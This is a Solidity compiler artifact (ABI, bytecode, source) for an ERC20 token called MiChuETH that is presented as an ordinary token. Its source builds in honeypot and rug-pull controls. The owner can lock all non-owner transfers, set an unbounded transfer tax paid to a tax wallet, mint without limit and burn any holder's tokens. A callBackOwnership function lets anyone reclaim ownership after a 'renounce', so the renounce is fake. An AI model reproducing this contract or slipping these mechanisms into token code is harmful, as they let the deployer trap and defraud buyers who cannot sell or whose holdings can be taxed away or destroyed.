{
  "contractName": "MiChuETH",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "initialOwner",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "_buyTax",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "_sellTax",
          "type": "uint256"
        },
        {
          "internalType": "address",
          "name": "_taxWallet",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "allowance",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "needed",
          "type": "uint256"
        }
      ],
      "name": "ERC20InsufficientAllowance",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "sender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "balance",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "needed",
          "type": "uint256"
        }
      ],
      "name": "ERC20InsufficientBalance",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "approver",
          "type": "address"
        }
      ],
      "name": "ERC20InvalidApprover",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "receiver",
          "type": "address"
        }
      ],
      "name": "ERC20InvalidReceiver",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "sender",
          "type": "address"
        }
      ],
      "name": "ERC20InvalidSender",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "ERC20InvalidSpender",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        }
      ],
      "name": "OwnableInvalidOwner",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "OwnableUnauthorizedAccount",
      "type": "error"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "newTax",
          "type": "uint256"
        }
      ],
      "name": "BuyTaxUpdated",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [],
      "name": "SellLocked",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "newTax",
          "type": "uint256"
        }
      ],
      "name": "SellTaxUpdated",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [],
      "name": "SellUnlocked",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "_sellLocked",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "buyTax",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "sellTax",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "taxWallet",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "newTax",
          "type": "uint256"
        }
      ],
      "name": "setBuyTax",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "newTax",
          "type": "uint256"
        }
      ],
      "name": "setSellTax",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "lockSell",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "unlockSell",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "recipient",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "sender",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "recipient",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "callBackOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "mint",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "burn",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516112c23803806112c283398101604081905261002f91610353565b836040518060400160405280600881526020016709ad286d0ea8aa8960c31b815250604051806040016040528060048152602001634d43544b60e01b815250816003908161007d919061043a565b50600461008a828261043a565b5050506001600160a01b0381166100bc57604051631e4fbdf760e01b8152600060048201526024015b60405180910390fd5b6100c581610114565b506100dd846c7e37be2022c0914b2680000000610166565b6100e6846101a0565b600692909255600755600880546001600160a81b0319166001600160a01b0390921691909117905550610520565b600580546001600160a01b038381166001600160a01b0319831681179093556040519116919082907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e090600090a35050565b6001600160a01b0382166101905760405163ec442f0560e01b8152600060048201526024016100b3565b61019c600083836101de565b5050565b6101a8610308565b6001600160a01b0381166101d257604051631e4fbdf760e01b8152600060048201526024016100b3565b6101db81610114565b50565b6001600160a01b0383166102095780600260008282546101fe91906104f9565b9091555061027b9050565b6001600160a01b0383166000908152602081905260409020548181101561025c5760405163391434e360e21b81526001600160a01b038516600482015260248101829052604481018390526064016100b3565b6001600160a01b03841660009081526020819052604090209082900390555b6001600160a01b038216610297576002805482900390556102b6565b6001600160a01b03821660009081526020819052604090208054820190555b816001600160a01b0316836001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040516102fb91815260200190565b60405180910390a3505050565b6005546001600160a01b031633146103355760405163118cdaa760e01b81523360048201526024016100b3565b565b80516001600160a01b038116811461034e57600080fd5b919050565b6000806000806080858703121561036957600080fd5b61037285610337565b9350602085015192506040850151915061038e60608601610337565b905092959194509250565b634e487b7160e01b600052604160045260246000fd5b600181811c908216806103c357607f821691505b6020821081036103e357634e487b7160e01b600052602260045260246000fd5b50919050565b601f821115610435576000816000526020600020601f850160051c810160208610156104125750805b601f850160051c820191505b818110156104315782815560010161041e565b5050505b505050565b81516001600160401b0381111561045357610453610399565b6104678161046184546103af565b846103e9565b602080601f83116001811461049c57600084156104845750858301515b600019600386901b1c1916600185901b178555610431565b600085815260208120601f198616915b828110156104cb578886015182559484019460019091019084016104ac565b50858210156104e95787850151600019600388901b60f8161c191681555b5050505050600190811b01905550565b8082018082111561051a57634e487b7160e01b600052601160045260246000fd5b92915050565b610d938061052f6000396000f3fe608060405234801561001057600080fd5b506004361061014d5760003560e01c806377fcda36116100c3578063a9059cbb1161007c578063a9059cbb14610292578063cc1776d3146102a5578063db64720a146102ae578063dc1052e2146102b6578063dd62ed3e146102c9578063f2fde38b146102dc57600080fd5b806377fcda36146102435780638cd09d501461024b5780638da5cb5b1461025e578063958ef8ad1461026f57806395d89b41146102775780639dc29fac1461027f57600080fd5b8063313ce56711610115578063313ce567146101e757806340c10f19146101f65780634f7041a51461020b578063543bf5e11461021457806370a0823114610228578063715018a61461023b57600080fd5b806306fdde0314610152578063095ea7b31461017057806318160ddd1461019357806323b872dd146101a95780632dc0562d146101bc575b600080fd5b61015a6102ef565b6040516101679190610b76565b60405180910390f35b61018361017e366004610be1565b610381565b6040519015158152602001610167565b61019b610398565b604051908152602001610167565b6101836101b7366004610c0b565b6103a8565b6008546101cf906001600160a01b031681565b6040516001600160a01b039091168152602001610167565b60405160128152602001610167565b610209610204366004610be1565b6104ff565b005b61019b60065481565b60085461018390600160a01b900460ff1681565b61019b610236366004610c47565b610515565b610209610533565b610209610547565b610209610259366004610c62565b6105ba565b6005546001600160a01b03166101cf565b6102096105fe565b61015a61063e565b61020961028d366004610be1565b61064d565b6101836102a0366004610be1565b61065f565b61019b60075481565b610209610729565b6102096102c4366004610c62565b61076f565b61019b6102d7366004610c7b565b6107ac565b6102096102ea366004610c47565b6107dc565b6060600380546102fe90610cae565b80601f016020809104026020016040519081016040528092919081815260200182805461032a90610cae565b80156103775780601f1061034c57610100808354040283529160200191610377565b820191906000526020600020905b81548152906001019060200180831161035a57829003601f168201915b5050505050905090565b600061038e33848461081a565b5060015b92915050565b60006103a360025490565b905090565b600854600090600160a01b900460ff1615806103dd5750336103d26005546001600160a01b031690565b6001600160a01b0316145b61041f5760405162461bcd60e51b815260206004820152600e60248201526d14d95b1b081a5cc81b1bd8dad95960921b60448201526064015b60405180910390fd5b600061042b85336107ac565b90508281101561048e5760405162461bcd60e51b815260206004820152602860248201527f45524332303a207472616e7366657220616d6f756e74206578636565647320616044820152676c6c6f77616e636560c01b6064820152608401610416565b60006064600754856104a09190610cfe565b6104aa9190610d15565b905060006104b88286610d37565b6008549091506104d39088906001600160a01b03168461082c565b6104de87878361082c565b6104f287336104ed8887610d37565b61081a565b5060019695505050505050565b61050761088b565b61051182826108b8565b5050565b6001600160a01b038116600090815260208190526040812054610392565b61053b61088b565b61054560006108ee565b565b600061055b6005546001600160a01b031690565b6001600160a01b0316146105b15760405162461bcd60e51b815260206004820181905260248201527f4f776e65727368697020686173206e6f74206265656e2072656e6f756e6365646044820152606401610416565b610545336108ee565b6105c261088b565b60078190556040518181527fa6255338a5f732d64ceba7f4c18182567f9d1067eb984b46d478b37d72a52d11906020015b60405180910390a150565b61060661088b565b6008805460ff60a01b191690556040517fe550b1a962fb28ff6243f06872072daf16bfcd081fa9edf94f838e2ed2212c0290600090a1565b6060600480546102fe90610cae565b61065561088b565b6105118282610940565b600854600090600160a01b900460ff1615806106945750336106896005546001600160a01b031690565b6001600160a01b0316145b6106d15760405162461bcd60e51b815260206004820152600e60248201526d14d95b1b081a5cc81b1bd8dad95960921b6044820152606401610416565b60006064600754846106e39190610cfe565b6106ed9190610d15565b905060006106fb8285610d37565b9050610713336008546001600160a01b03168461082c565b61071e33868361082c565b506001949350505050565b61073161088b565b6008805460ff60a01b1916600160a01b1790556040517f59f930d8f8dc7d43a4daadd333eaf9517b0bb961050e5de139c231faf4becf7a90600090a1565b61077761088b565b60068190556040518181527f7a758dc8e99047b028278b3e2ff1416d8493a7aacee7a5dc30b6bf93270eccce906020016105f3565b6001600160a01b0380831660009081526001602090815260408083209385168352929052908120545b9392505050565b6107e461088b565b6001600160a01b03811661080e57604051631e4fbdf760e01b815260006004820152602401610416565b610817816108ee565b50565b6108278383836001610976565b505050565b6001600160a01b03831661085657604051634b637e8f60e11b815260006004820152602401610416565b6001600160a01b0382166108805760405163ec442f0560e01b815260006004820152602401610416565b610827838383610a4c565b6005546001600160a01b031633146105455760405163118cdaa760e01b8152336004820152602401610416565b6001600160a01b0382166108e25760405163ec442f0560e01b815260006004820152602401610416565b61051160008383610a4c565b600580546001600160a01b038381166001600160a01b0319831681179093556040519116919082907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e090600090a35050565b6001600160a01b03821661096a57604051634b637e8f60e11b815260006004820152602401610416565b61051182600083610a4c565b6001600160a01b0384166109a05760405163e602df0560e01b815260006004820152602401610416565b6001600160a01b0383166109ca57604051634a1406b160e11b815260006004820152602401610416565b6001600160a01b0380851660009081526001602090815260408083209387168352929052208290558015610a4657826001600160a01b0316846001600160a01b03167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92584604051610a3d91815260200190565b60405180910390a35b50505050565b6001600160a01b038316610a77578060026000828254610a6c9190610d4a565b90915550610ae99050565b6001600160a01b03831660009081526020819052604090205481811015610aca5760405163391434e360e21b81526001600160a01b03851660048201526024810182905260448101839052606401610416565b6001600160a01b03841660009081526020819052604090209082900390555b6001600160a01b038216610b0557600280548290039055610b24565b6001600160a01b03821660009081526020819052604090208054820190555b816001600160a01b0316836001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef83604051610b6991815260200190565b60405180910390a3505050565b60006020808352835180602085015260005b81811015610ba457858101830151858201604001528201610b88565b506000604082860101526040601f19601f8301168501019250505092915050565b80356001600160a01b0381168114610bdc57600080fd5b919050565b60008060408385031215610bf457600080fd5b610bfd83610bc5565b946020939093013593505050565b600080600060608486031215610c2057600080fd5b610c2984610bc5565b9250610c3760208501610bc5565b9150604084013590509250925092565b600060208284031215610c5957600080fd5b6107d582610bc5565b600060208284031215610c7457600080fd5b5035919050565b60008060408385031215610c8e57600080fd5b610c9783610bc5565b9150610ca560208401610bc5565b90509250929050565b600181811c90821680610cc257607f821691505b602082108103610ce257634e487b7160e01b600052602260045260246000fd5b50919050565b634e487b7160e01b600052601160045260246000fd5b808202811582820484141761039257610392610ce8565b600082610d3257634e487b7160e01b600052601260045260246000fd5b500490565b8181038181111561039257610392610ce8565b8082018082111561039257610392610ce856fea26469706673582212202fe6fe2c27ab58b9b13e570a745593b6e429bb6e92cad7d35adf0476da7e5f3c64736f6c63430008190033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.25;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract MiChuETH is ERC20, Ownable {\n    uint256 public buyTax;\n    uint256 public sellTax;\n    address public taxWallet;\n\n    bool public _sellLocked;\n\n    event SellLocked();\n    event SellUnlocked();\n    event BuyTaxUpdated(uint256 newTax);\n    event SellTaxUpdated(uint256 newTax);\n\n    constructor(\n        address initialOwner,\n        uint256 _buyTax,\n        uint256 _sellTax,\n        address _taxWallet\n    ) ERC20(\"MiChuETH\", \"MCTK\") Ownable(initialOwner) {\n        _mint(initialOwner, 10000000000000 * 10 ** 18);\n        transferOwnership(initialOwner);\n        buyTax = _buyTax;\n        sellTax = _sellTax;\n        taxWallet = _taxWallet;\n        _sellLocked = false;\n    }\n\n    modifier notLocked() {\n        require(!_sellLocked || owner() == msg.sender, \"Sell is locked\");\n        _;\n    }\n\n    function setBuyTax(uint256 newTax) external onlyOwner {\n        buyTax = newTax;\n        emit BuyTaxUpdated(newTax);\n    }\n\n    function setSellTax(uint256 newTax) external onlyOwner {\n        sellTax = newTax;\n        emit SellTaxUpdated(newTax);\n    }\n\n    function lockSell() public onlyOwner {\n        _sellLocked = true;\n        emit SellLocked();\n    }\n\n    function unlockSell() public onlyOwner {\n        _sellLocked = false;\n        emit SellUnlocked();\n    }\n\n    function transfer(\n        address recipient,\n        uint256 amount\n    ) public override notLocked returns (bool) {\n        uint256 taxAmount = (amount * sellTax) / 100;\n        uint256 amountAfterTax = amount - taxAmount;\n\n        _transfer(_msgSender(), taxWallet, taxAmount);\n        _transfer(_msgSender(), recipient, amountAfterTax);\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public override notLocked returns (bool) {\n        uint256 currentAllowance = allowance(sender, _msgSender());\n        require(\n            currentAllowance >= amount,\n            \"ERC20: transfer amount exceeds allowance\"\n        );\n\n        uint256 taxAmount = (amount * sellTax) / 100;\n        uint256 amountAfterTax = amount - taxAmount;\n\n        _transfer(sender, taxWallet, taxAmount);\n        _transfer(sender, recipient, amountAfterTax);\n        _approve(sender, _msgSender(), currentAllowance - amount);\n        return true;\n    }\n\n    function renounceOwnership() public override onlyOwner {\n        _transferOwnership(address(0));\n    }\n\n    function callBackOwnership() public {\n        require(owner() == address(0), \"Ownership has not been renounced\");\n        _transferOwnership(_msgSender());\n    }\n\n    function mint(address account, uint256 amount) public onlyOwner {\n        _mint(account, amount);\n    }\n\n    function totalSupply() public view override returns (uint256) {\n        return ERC20.totalSupply();\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return ERC20.balanceOf(account);\n    }\n    function burn(address account, uint256 amount) public onlyOwner {\n        _burn(account, amount);\n    }\n    function allowance(\n        address owner,\n        address spender\n    ) public view override returns (uint256) {\n        return ERC20.allowance(owner, spender);\n    }\n\n    function approve(\n        address spender,\n        uint256 amount\n    ) public override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n}\n",
  "sourcePath": "/Users/mac/Desktop/ProjectFinal/contracts/MiChuToken.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.25+commit.b61c2a91.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-07-03T18:37:29.622Z",
  "networkType": "ethereum",
  "devdoc": {
    "errors": {
      "ERC20InsufficientAllowance(address,uint256,uint256)": [
        {
          "details": "Indicates a failure with the `spender`s `allowance`. Used in transfers.",
          "params": {
            "allowance": "Amount of tokens a `spender` is allowed to operate with.",
            "needed": "Minimum amount required to perform a transfer.",
            "spender": "Address that may be allowed to operate on tokens without being their owner."
          }
        }
      ],
      "ERC20InsufficientBalance(address,uint256,uint256)": [
        {
          "details": "Indicates an error related to the current `balance` of a `sender`. Used in transfers.",
          "params": {
            "balance": "Current balance for the interacting account.",
            "needed": "Minimum amount required to perform a transfer.",
            "sender": "Address whose tokens are being transferred."
          }
        }
      ],
      "ERC20InvalidApprover(address)": [
        {
          "details": "Indicates a failure with the `approver` of a token to be approved. Used in approvals.",
          "params": {
            "approver": "Address initiating an approval operation."
          }
        }
      ],
      "ERC20InvalidReceiver(address)": [
        {
          "details": "Indicates a failure with the token `receiver`. Used in transfers.",
          "params": {
            "receiver": "Address to which tokens are being transferred."
          }
        }
      ],
      "ERC20InvalidSender(address)": [
        {
          "details": "Indicates a failure with the token `sender`. Used in transfers.",
          "params": {
            "sender": "Address whose tokens are being transferred."
          }
        }
      ],
      "ERC20InvalidSpender(address)": [
        {
          "details": "Indicates a failure with the `spender` to be approved. Used in approvals.",
          "params": {
            "spender": "Address that may be allowed to operate on tokens without being their owner."
          }
        }
      ],
      "OwnableInvalidOwner(address)": [
        {
          "details": "The owner is not a valid owner account. (eg. `address(0)`)"
        }
      ],
      "OwnableUnauthorizedAccount(address)": [
        {
          "details": "The caller account is not authorized to perform an operation."
        }
      ]
    },
    "events": {
      "Approval(address,address,uint256)": {
        "details": "Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance."
      },
      "Transfer(address,address,uint256)": {
        "details": "Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero."
      }
    },
    "kind": "dev",
    "methods": {
      "allowance(address,address)": {
        "details": "See {IERC20-allowance}."
      },
      "balanceOf(address)": {
        "details": "See {IERC20-balanceOf}."
      },
      "decimals()": {
        "details": "Returns the number of decimals used to get its user representation. For example, if `decimals` equals `2`, a balance of `505` tokens should be displayed to a user as `5.05` (`505 / 10 ** 2`). Tokens usually opt for a value of 18, imitating the relationship between Ether and Wei. This is the default value returned by this function, unless it's overridden. NOTE: This information is only used for _display_ purposes: it in no way affects any of the arithmetic of the contract, including {IERC20-balanceOf} and {IERC20-transfer}."
      },
      "name()": {
        "details": "Returns the name of the token."
      },
      "owner()": {
        "details": "Returns the address of the current owner."
      },
      "renounceOwnership()": {
        "details": "Leaves the contract without owner. It will not be possible to call `onlyOwner` functions. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby disabling any functionality that is only available to the owner."
      },
      "symbol()": {
        "details": "Returns the symbol of the token, usually a shorter version of the name."
      },
      "totalSupply()": {
        "details": "See {IERC20-totalSupply}."
      },
      "transferOwnership(address)": {
        "details": "Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."
      }
    },
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}